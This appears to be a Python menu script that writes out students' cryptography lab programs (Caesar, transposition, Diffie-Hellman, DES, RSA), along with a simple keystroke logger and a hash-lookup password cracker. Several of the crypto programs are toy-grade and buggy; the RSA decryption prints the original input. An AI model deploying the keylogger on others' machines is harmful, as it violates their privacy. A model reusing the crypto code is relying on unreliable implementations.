from pathlib import Path

Ceaser_Cipher = '''
#include <iostream>
using namespace std;

int main()
{
    string text;
    int shiftingbits = 0;

    cout << "Enter the String : " << endl;
    getline(cin, text);
   
    cout << "Enter the shift : " << endl;
    cin >> shiftingbits;

    cout << "Text Inputed : " << text << endl;

    string encryptedText = "";
    for (int i = 0; i < text.length(); i++) {
        if (isupper(text[i]))
            encryptedText += char(int(text[i] + shiftingbits - 65) % 26 + 65);
        else
            encryptedText += char(int(text[i] + shiftingbits - 97) % 26 + 97);
    }
    cout << "Cipher (Encrypted Text) : " << encryptedText << endl;

    string decryptedText = "";
    for (int i = 0; i < encryptedText.length(); i++) {
        if (isupper(encryptedText[i]))
            decryptedText += char(int(encryptedText[i] - shiftingbits - 65 + 26) % 26 + 65);
        else
            decryptedText += char(int(encryptedText[i] - shiftingbits - 97 + 26) % 26 + 97);
    }
    cout << "Decrypted Text : " << decryptedText << endl;

    return 0;
}
'''

Row_column_transpose = r"""
#include <iostream>
#include <string>
using namespace std;

int main() {
    const int MAX_WORDS = 100; // Maximum number of words
    const int MAX_LENGTH = 100; // Maximum length of each word

    // Buffer for the input sentence
    char sentence[MAX_WORDS * MAX_LENGTH];
    cout << "Enter a sentence: ";
    cin.getline(sentence, sizeof(sentence));

    // 2D array to store words
    char words[MAX_WORDS][MAX_LENGTH] = {0};
    int word_count = 0, max_word_length = 0, current_word_length = 0;

    // Tokenize the sentence into words
    for (int i = 0, j = 0; sentence[i] != '\0'; ++i) {
        if (sentence[i] != ' ') {
            words[word_count][j++] = sentence[i];
            current_word_length++;
        } else {
            words[word_count][current_word_length] = '\0';
            if (current_word_length > max_word_length) max_word_length = current_word_length;
            current_word_length = 0; word_count++; j = 0;
        }
    }
    // Ensure the last word is considered
    words[word_count][current_word_length] = '\0';
    if (current_word_length > max_word_length) max_word_length = current_word_length;
    word_count++;

    // Create a matrix of words padded with '*'
    char matrix[MAX_WORDS][MAX_LENGTH] = {0};
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) {
            if (words[i][j] != '\0') matrix[i][j] = words[i][j];
            else matrix[i][j] = '*';
        }
    }

    // Print the original matrix
    cout << "Original Matrix:" << endl;
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) cout << matrix[i][j] << ' ';
        cout << endl;
    }

    // Row transposition: Move the last row to the first position
    char temp[MAX_LENGTH] = {0};
    for (int j = 0; j < max_word_length; j++) temp[j] = matrix[word_count - 1][j];
    for (int i = word_count - 1; i > 0; i--) {
        for (int j = 0; j < max_word_length; j++) matrix[i][j] = matrix[i - 1][j];
    }
    for (int j = 0; j < max_word_length; j++) matrix[0][j] = temp[j];

    // Print the row-transposed matrix
    cout << "\nRow Transposed Matrix:" << endl;
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) cout << matrix[i][j] << ' ';
        cout << endl;
    }

    // Column transposition: Move the last column to the first position
    for (int i = 0; i < word_count; i++) {
        char temp_col = matrix[i][max_word_length - 1];
        for (int j = max_word_length - 1; j > 0; j--) matrix[i][j] = matrix[i][j - 1];
        matrix[i][0] = temp_col;
    }

    // Print the column-transposed matrix
    cout << "\nColumn Transposed Matrix:" << endl;
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) cout << matrix[i][j] << ' ';
        cout << endl;
    }

    // Convert the encrypted matrix to a string
    string encrypted_sentence;
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) encrypted_sentence += matrix[i][j];
    }
    cout << "Encrypted Statement: " << encrypted_sentence << endl;

    // Decryption process

    // Reverse column transposition: Move the first column to the last position
    cout << "\nColumn Re-transposed Matrix:" << endl;
    for (int i = 0; i < word_count; i++) {
        char temp_col = matrix[i][0];
        for (int j = 0; j < max_word_length - 1; j++) matrix[i][j] = matrix[i][j + 1];
        matrix[i][max_word_length - 1] = temp_col;
    }

    // Print the column re-transposed matrix
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) cout << matrix[i][j] << ' ';
        cout << endl;
    }

    // Reverse row transposition: Move the first row to the last position
    for (int j = 0; j < max_word_length; j++) temp[j] = matrix[0][j];
    for (int i = 0; i < word_count - 1; i++) {
        for (int j = 0; j < max_word_length; j++) matrix[i][j] = matrix[i + 1][j];
    }
    for (int j = 0; j < max_word_length; j++) matrix[word_count - 1][j] = temp[j];

    // Print the row re-transposed matrix
    cout << "\nRow Re-transposed Matrix:" << endl;
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) cout << matrix[i][j] << ' ';
        cout << endl;
    }

    // Convert the decrypted matrix to a string
    string decrypted_sentence;
    for (int i = 0; i < word_count; i++) {
        for (int j = 0; j < max_word_length; j++) {
            if (matrix[i][j] != '*') decrypted_sentence += matrix[i][j];
        }
        if (i < word_count - 1) decrypted_sentence += ' ';
    }

    cout << "Decrypted Statement: " << decrypted_sentence << endl;
    return 0;
}
"""

Diffie_Hellman = """
#include<iostream>
#include<cmath>
using namespace std;
int main()
{
    int p=23, g=5;
    int a,b;
    cout<<"Enter alice's private key: ";
    cin>>a;
    cout<<"Enter bob's private key: ";
    cin>>b;
    long int A = fmod(pow(g,a),p);
    long int B = fmod(pow(g,b),p);
    cout<<"Computed values of Alice and Bob "<<A<<" and "<<B;
    long int s1 = fmod(pow(A,b),p);
    long int s2 = fmod(pow(B,a),p);
    cout<<endl<<s1<<" "<<s2<<endl;
    if(s1==s2)
    {
        cout<<"Secret Shared Successfully";
    }
}
"""

Password_Cracking = """
import pandas as pd

filename = 'hashes.csv' 
df = pd.read_csv(filename)

rainbow_table_md5 = dict(zip(df['MD5 Hash'], df['Name']))
rainbow_table_sha256 = dict(zip(df['SHA-256 Hash'], df['Name']))
rainbow_table_blowfish = dict(zip(df['Blowfish Hash'], df['Name']))

rainbow_table_name = dict(zip(df['Name'], zip(df['MD5 Hash'], df['SHA-256 Hash'], df['Blowfish Hash'])))

def lookup(value):
    if value in rainbow_table_md5:
        return f"MD5 Hash matched for Name: {rainbow_table_md5[value]}"
    elif value in rainbow_table_sha256:
        return f"SHA-256 Hash matched for Name: {rainbow_table_sha256[value]}"
    elif value in rainbow_table_blowfish:
        return f"Blowfish Hash matched for Name: {rainbow_table_blowfish[value]}"
    elif value in rainbow_table_name:
        md5, sha256, blowfish = rainbow_table_name[value]
        return (f"Name: {value}"
                f"MD5 Hash: {md5}"
                f"SHA-256 Hash: {sha256}"
                f"Blowfish Hash: {blowfish}")
    else:
        return "Input not found in the table."

user_input = input("Enter a hash/name : ")  
result = lookup(user_input)
print(result)

"""
    
Password_Cracking_CSV_table = """
Name,MD5 Hash,SHA-256 Hash,Blowfish Hash
XeUXvuUt,3c77c5172d589047241837427cdb2a14,fac06a7d3dd0e8450ff3f0806bc45e02a551f49653338a16902ad8bc8ab0dc78,50be369589c4312171ada24184648819
fClFnROm,3bb4002ca287d3cfcfec026ec740627c,7a46ae7b4eb04f4dec97c2c2120d53452603017195624cfe992c66a431054b4f,9e714bfeec5ac1a0e99e6233754f6616
"""

Des = """
#include <iostream>
#include <string>
#include <bitset>
using namespace std;

int main()
{
    int i;
    int new_arr[64];
    int ip[64] = {58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
                  62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
                  57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
                  61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7};
    int l_side[32], r_side[32];
    int input_block[64] = {1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0};

    for (i = 0; i < 64; i++)
    {
        int temp = ip[i] - 1;
        new_arr[i] = input_block[temp];
    }

    int c = 0;
    for (i = 0; i < 64; i++)
    {
        cout << new_arr[i] << ",";
        c++;
        if (c == 8)
        {
            cout << endl;
            c = 0;
        }
    }

    for (i = 0; i < 32; i++)
    {
        l_side[i] = new_arr[i];
        r_side[i] = new_arr[i + 32];
    }

    cout << "left part:" << endl;
    for (i = 0; i < 32; i++)
    {
        cout << l_side[i] << " ,";
    }
    cout << endl;
    cout << "New Left Part" << endl;

    cout << "right part:" << endl;
    for (i = 0; i < 32; i++)
    {
        cout << r_side[i] << " ,";
    }
    cout << endl;

    int key[64] = {
        0, 1, 1, 0, 1, 0, 0, 1,
        1, 0, 0, 1, 1, 1, 0, 0,
        0, 1, 0, 1, 1, 0, 1, 0,
        1, 0, 1, 0, 0, 0, 1, 1,
        1, 0, 1, 0, 0, 1, 1, 0,
        0, 0, 1, 1, 1, 0, 1, 0,
        0, 1, 0, 1, 1, 1, 0, 0,
        1, 0, 1, 0, 0, 1, 0, 1};

    int array_56_bit[56], c1 = 0;
    for (int i = 0; i < 64; i++)
    {
        if ((i + 1) % 8 == 0)
        {
            continue;
        }
        else
        {
            array_56_bit[c1++] = key[i];
        }
    }

    cout << "Array after removing 8th positions:" << endl;
    for (i = 0; i < 56; i++)
    {
        cout << array_56_bit[i] << " ,";
    }
    cout << endl;

    int lkey[28], rkey[28];
    for (i = 0; i < 28; i++)
    {
        lkey[i] = array_56_bit[i];
        rkey[i] = array_56_bit[i + 28];
    }

    cout << "left key" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << lkey[i] << " ";
    }
    cout << endl;

    cout << "right key" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << rkey[i] << " ";
    }
    cout << endl;

    int templ = lkey[0];
    int tempr = rkey[0];
    for (int i = 1; i < 28; i++)
    {
        lkey[i - 1] = lkey[i];
        rkey[i - 1] = rkey[i];
    }
    lkey[27] = templ;
    rkey[27] = tempr;

    cout << "Left key after rotation" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << lkey[i] << " ";
    }
    cout << endl;

    cout << "Right key after rotation" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << rkey[i] << " ";
    }
    cout << endl;

    cout << "Concatenated Array:" << endl;
    int concatened_arr[56];
    for (i = 0; i < 28; i++)
    {
        concatened_arr[i] = lkey[i];
        concatened_arr[i + 28] = rkey[i];
    }
    for (i = 0; i < 56; i++)
    {
        cout << concatened_arr[i] << " ";
    }
    cout << endl;

    int compression_key_table[48] = {
        14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10,
        23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,
        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32};

    int compressed_key_array[48];
    for (i = 0; i < 48; i++)
    {
        int temp3 = compression_key_table[i];
        compressed_key_array[i] = concatened_arr[temp3 - 1];
    }

    cout << "After Compression from 56 to 48:" << endl;
    for (i = 0; i < 48; i++)
    {
        cout << compressed_key_array[i] << " ";
    }
    cout << endl;

    int exp_d[48] = {32, 1, 2, 3, 4, 5, 4, 5,
                     6, 7, 8, 9, 8, 9, 10, 11,
                     12, 13, 12, 13, 14, 15, 16, 17,
                     16, 17, 18, 19, 20, 21, 20, 21,
                     22, 23, 24, 25, 24, 25, 26, 27,
                     28, 29, 28, 29, 30, 31, 32, 1};

    int new_right[48];
    for (i = 0; i < 48; i++)
    {
        new_right[i] = r_side[exp_d[i] - 1];
    }

    cout << "After Expansion from 32 to 48 of right part:" << endl;
    for (i = 0; i < 48; i++)
    {
        cout << new_right[i] << " ,";
    }
    cout << endl;

    // XOR operation between new_right and compressed_key_array
    int xor_result[48];
    for (i = 0; i < 48; i++)
    {
        xor_result[i] = new_right[i] ^ compressed_key_array[i];
    }

    cout << "XOR Result of new_right and compressed_key_array:" << endl;
    for (i = 0; i < 48; i++)
    {
        cout << xor_result[i] << " ,";
    }
    cout << endl;

    int sbox1[4][16] = {
        14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
        0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
        4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
        15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13};
    int sbox2[4][16] = {
        15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
        3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
        0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
        13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9};

    int sbox3[4][16] = {
        10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
        13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
        13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
        1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12};

    int sbox4[4][16] = {
        7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
        13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
        10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
        3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14};

    int sbox5[4][16] = {
        2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
        14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
        4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
        11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3};

    int sbox6[4][16] = {
        12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
        10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
        9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
        4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13};

    int sbox7[4][16] = {
        4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
        13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
        1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
        6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12};

    int sbox8[4][16] = {
        13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
        1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
        7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
        2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11

    };
    int function_op[32];
    int b0, b1, b2, b3, b4, b5;
    int row = 0, column = 0;
    int sbox_result[32];
    int sbox_count = 0;
    int new_val = 0;
    for (int i = 0; i < 48; i += 6)
    {
        b0 = xor_result[i];
        b1 = xor_result[i + 1];
        b2 = xor_result[i + 2];
        b3 = xor_result[i + 3];
        b4 = xor_result[i + 4];
        b5 = xor_result[i + 5];
        if (b0 == 0 && b5 == 0)
        {
            row = 0;
        }
        else if (b0 == 0 && b5 == 1)
        {
            row = 1;
        }
        else if (b0 == 1 && b5 == 0)
        {
            row = 2;
        }
        else if (b0 == 1 && b5 == 1)
        {
            row = 3;
        }
        string column = to_string(b1) + to_string(b2) + to_string(b3) + to_string(b4);
        cout << column;

        cout << endl;

        string binaryString = column;
        bitset<32> bitset(binaryString);
        unsigned long long intValue = bitset.to_ullong();

        cout << "Binary string: " << binaryString << endl;
        cout << "Integer value: " << intValue << endl;

        if (i == 0)
        {
            new_val = sbox1[row][intValue];
        }
        else if (i == 6)
        {
            new_val = sbox2[row][intValue];
        }
        else if (i == 12)
        {
            new_val = sbox3[row][intValue];
        }
        else if (i == 18)
        {
            new_val = sbox4[row][intValue];
        }
        else if (i == 24)
        {
            new_val = sbox5[row][intValue];
        }
        else if (i == 30)
        {
            new_val = sbox6[row][intValue];
        }
        else if (i == 36)
        {
            new_val = sbox7[row][intValue];
        }
        else
        {
            new_val = sbox8[row][intValue];
        }
        std::bitset<4> binary(new_val);
        std::cout << "Binary representation of " << new_val << " is " << binary << std::endl;
        cout << endl;

        for (size_t k = binary.size(); k-- > 0;)
        {
            sbox_result[sbox_count] = binary[k];
            sbox_count++;
        }
    }
    for (int i = 0; i < 32; i++)
    {
        cout << sbox_result[i] << " ,";
    }
    cout << endl;

    int perm_final[32] = {
        16, 7, 20, 21, 29, 12, 28, 17,
        1, 15, 23, 26, 5, 18, 31, 10,
        2, 8, 24, 14, 32, 27, 3, 9,
        19, 13, 30, 6, 22, 11, 4, 25};

    int temp96 = 0;
    int new_right_final[32];
    int first_val = perm_final[0];
    for (int j = 1; j <= 32; j++)
    {
        temp96 = perm_final[j];
        new_right_final[j] = sbox_result[temp96 - 1];
    }
    cout << "After Permutation of right side\n";
    for (int j = 0; j < 32; j++)
    {
        cout << new_right_final[j] << " ,";
    }
    int new_right_final2[32];
    for (i = 0; i < 32; i++)
    {
        new_right_final2[i] = l_side[i] ^ new_right_final[i];
    }
    cout << "\nAfter X-OR with og left part\n";
    for (int j = 0; j < 32; j++)
    {
        cout << new_right_final2[j] << " ,";
    }
    for (i = 0; i < 32; i++)
    {
        l_side[i] = r_side[i];
    }

    cout << "\nGUYSSSSS ROUND 1 COMPLETED BY ARJ";
    cout << "\nL1 VALUE: ";
    for (i = 0; i < 32; i++)
    {
        cout << l_side[i] << " ,";
    }
    cout << "\nR1 VALUE: ";
    for (i = 0; i < 32; i++)
    {
        cout << new_right_final2[i] << " ,";
    }
}
"""

Key_logger = """ 
from pynput import keyboard

def keyPressed(key):
	print(str(key))
	with open("keyfile.txt","a") as logKey:
		try:
			char = key.char
			logKey.write(char)
		except: 
			print("Error getting char")

if __name__ == "__main__":
	listener = keyboard.Listener(on_press=keyPressed)
	listener.start()
	input()
"""

RSA = """ 
#include<iostream>
#include<vector>
#include<cmath>
using namespace std;

int gcd(int a, int b) {
    while (b != 0) {
        int temp = b;
        b = a % b;
        a = temp;
    }
    return a;
}

int mod_inverse(int e, int phi) {
    int t = 0, newt = 1;
    int r = phi, newr = e;
   
    while (newr != 0) {
        int quotient = r / newr;
        int temp = t;
        t = newt;
        newt = temp - quotient * newt;
       
        temp = r;
        r = newr;
        newr = temp - quotient * newr;
    }
    if (t < 0) {
        t += phi;
    }
   
    return t;
}


int find_e(int phi_n) {
    int e = 2;
    while (e < phi_n) {
        if (gcd(e, phi_n) == 1) {
            return e;
        }
        e++;
    }
    return -1;  
}

long long mod_pow(long long base, long long exp, long long mod) {
    long long result = 1;
    while (exp > 0) {
        if (exp % 2 == 1) {
            result = (result * base) % mod;
        }
        base = (base * base) % mod;
        exp /= 2;
    }
    return result;
}

int main() {
    cout << "Enter two prime numbers:" << endl;
    int p, q;
    cin >> p >> q;

    int n = p * q;
    int phi_n = (p - 1) * (q - 1);

    int e = find_e(phi_n);
    if (e == -1) {
        cout << "No valid 'e' found." << endl;
        return 1;
    }
    cout << "Public key (e, n): (" << e << ", " << n << ")" << endl;

    int d = mod_inverse(e, phi_n);
    cout << "Private key (d, n): (" << d << ", " << n << ")" << endl;

    string message;
    cout << "Enter a message to encrypt: ";
    cin.ignore();
    getline(cin, message);

    vector<long long> encrypted_message;
    cout << "Encrypted message: ";
    for (char c : message) {
        int ascii_value = (int)c;
        long long encrypted_char = mod_pow(ascii_value, e, n);
        encrypted_message.push_back(encrypted_char);
        cout << encrypted_char << " ";
    }
    cout << endl;

    cout << "Decrypted message: ";
    for (long long encrypted_char : encrypted_message) {
        long long decrypted_char = mod_pow(encrypted_char, d, n);

    }
    cout<<message;
    cout << endl;

    return 0;
}
"""

def main():
    print("""
    1. Caesar Cipher
    2. Row Column Transpose
    3. Diffie-Hellman
    4. DES
    5. Key Logger
    6. RSA
    7. Password Cracking (Rainbow Table)
    """)

    x = int(input("Enter No.: "))

    match x:
            case 1:
                print("File Downloaded")
                with open(Path.home() / 'Downloads' / "Ceaser_Cipher.cpp", "w") as f:
                    f.write(Ceaser_Cipher)
            case 2:
                print("File Downloaded")
                with open("Row_column_transpose.cpp", "w") as f:
                    f.write(Row_column_transpose)
            case 3:
                print("File Downloaded")
                with open("Diffie_Hellman.cpp", "w") as f:
                    f.write(Diffie_Hellman)
            case 4:
                print("File Downloaded")
                with open("Des.cpp", "w") as f:
                    f.write(Des)
            case 5:
                print("File Downloaded")
                with open("Key_logger.py", "w") as f:
                    f.write(Key_logger)
            case 6:
                print("File Downloaded")
                with open("RSA.cpp", "w") as f:
                    f.write(RSA)
            case 7:
                print("File Downloaded")
                with open("Password_Cracking.py", "w") as f:
                    f.write(Password_Cracking)
                with open("hashes.csv", "w") as f:
                    f.write(Password_Cracking_CSV_table)
            case _:
                print("\nNumber toh Barobar Dal\nIder Bhi Error Create kar ra hai")
